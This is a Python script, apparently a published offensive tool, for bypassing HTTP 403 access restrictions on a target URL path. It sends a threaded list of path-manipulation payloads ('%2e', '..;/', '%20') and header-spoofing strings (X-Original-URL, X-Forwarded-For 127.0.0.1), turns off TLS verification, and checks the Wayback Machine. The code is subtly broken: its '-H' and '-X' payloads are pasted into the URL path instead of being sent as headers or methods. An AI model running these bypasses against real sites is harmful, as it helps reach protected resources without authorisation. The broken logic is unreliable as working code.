import argparse
import requests
import json
import re
import threading
from requests.packages.urllib3.exceptions import InsecureRequestWarning
from tabulate import tabulate

def is_valid_url(url):
    # Check if the URL starts with http:// or https:// and doesn't end with /
    return re.match(r'^https?://[^/]+$', url)

def format_path(path):
    # Replace spaces with hyphens
    return path.replace(' ', '-')

def send_request(url, payload, results):
    full_url = f"{url}/{payload}"
    response = requests.get(full_url, verify=False)  # Disable SSL verification
    status_code = response.status_code
    content_length = len(response.content)
    results.append([full_url, status_code, content_length])

# Disable SSL warnings
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

twitter_url = 'https://spyboy.in/twitter'
discord = 'https://spyboy.in/Discord'
website = 'https://spyboy.in/'
blog = 'https://spyboy.blog/'

VERSION = '0.0.4'

R = '\033[31m'  # red
G = '\033[32m'  # green
C = '\033[36m'  # cyan
W = '\033[0m'  # white
Y = '\033[33m'  # yellow

banner = r'''                                                                                             
 _ _ _     _   _____         _____         _       
| | | |___| |_|   __|___ ___|  _  |___ ___| |_ ___ 
| | | | -_| . |__   | -_|  _|   __|  _| . | . | -_|
|_____|___|___|_____|___|___|__|  |_| |___|___|___|
     Web Security Assessment Tool               
'''

print(f'{C}{banner}{W}')
print(f'{G}[~] {Y}Version      : {W}{VERSION}')
print(f'{G}[~] {Y}Created By   : {W}Spyboy')
print(f'{G} ╰➤ {Y}Twitter      : {W}{twitter_url}')
print(f'{G} ╰➤ {Y}Discord      : {W}{discord}')
print(f'{G} ╰➤ {Y}Website      : {W}{website}')
print(f'{G} ╰➤ {Y}Blog         : {W}{blog}\n')

# Define a function to handle the command-line interface
def main():
    # Create an argument parser
    parser = argparse.ArgumentParser(description='Web Security Assessment Tool')
    parser.add_argument('url', type=str, help='Target URL (e.g., https://example.com)')
    parser.add_argument('path', type=str, help='Path to assess (e.g., /path/to/assess)')

    # Parse command-line arguments
    args = parser.parse_args()
    url = args.url
    path = args.path

    # Validate the URL
    if not is_valid_url(url):
        print("Invalid URL. It should start with http:// or https:// and should not end with /")
        exit(1)

    # Format the path by replacing spaces with hyphens
    path = format_path(path)

    # List of payloads
    payloads = [
        "",
        "%2e" + path,
        path + "/.",
        "//" + path + "//",
        "./" + path + "/./",
        "-H X-Original-URL: " + path,
        "-H X-Custom-IP-Authorization: 127.0.0.1",
        "-H X-Forwarded-For: http://127.0.0.1",
        "-H X-Forwarded-For: 127.0.0.1:80",
        "-H X-rewrite-url: " + path,
        path + "%20",
        path + "%09",
        path + "?",
        path + ".html",
        path + "/?anything",
        path + "#",
        "-H Content-Length:0 -X POST",
        path + "/*",
        path + ".php",
        path + ".json",
        "-X TRACE",
        "-H X-Host: 127.0.0.1",
        path + "..;/",
        " " + path + ";/"
    ]

    results = []

    threads = []

    for payload in payloads:
        thread = threading.Thread(target=send_request, args=(url, payload, results))
        threads.append(thread)
        thread.start()

    # Wait for all threads to complete
    for thread in threads:
        thread.join()

    # Print the results in a table
    table_headers = ["URL", "Status Code", "Content Length"]
    print(tabulate(results, headers=table_headers, tablefmt="grid"))

    # Wayback machine code
    print("Wayback machine:")

    # Create Wayback Machine API URL
    wayback_url = f"https://web.archive.org/cdx/search/cdx?url={url}/{path}&output=json"

    # Fetch snapshots using the Wayback Machine API
    response = requests.get(wayback_url)
    snapshots = json.loads(response.text)

    if snapshots:
        print("Available snapshots:")
        for snapshot in snapshots:
            timestamp = snapshot[1]
            original_url = snapshot[2]
            wayback_url = f"https://web.archive.org/web/{timestamp}/{original_url}"
            print(f"Timestamp: {timestamp}")
            #print(f"Original URL: {original_url}")
            print(f"Wayback URL: {wayback_url}")
            print()
    else:
        print("No available snapshots found in Wayback Machine.")

if __name__ == "__main__":
    main()
